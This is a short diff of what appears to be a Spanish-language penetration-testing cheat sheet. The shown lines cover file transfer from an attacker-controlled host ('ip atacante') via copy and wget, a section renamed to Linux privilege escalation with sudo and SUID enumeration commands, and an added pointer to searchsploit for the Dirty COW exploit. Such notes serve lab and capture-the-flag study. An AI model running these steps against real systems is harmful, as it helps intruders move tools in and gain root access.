@@ -64,9 +64,10 @@ windows: copy \\<ip atacante>\recurso\archivo.extension archivo.extension
 wget http://<ip que esta enviando el archivo>:<puerto>/archivo.etension -O archivo.extension
 
 
-######## saber permisos en linux ########
+######## escalar privilegios en linux ########
 permisos sudo: sudo -l
 permisos suid: find / -type f -perm -4000 -ls 2>/dev/null
+linux versiones anteriores searchsploit dirty cow
 
 
 #####obtener texto de la web #########
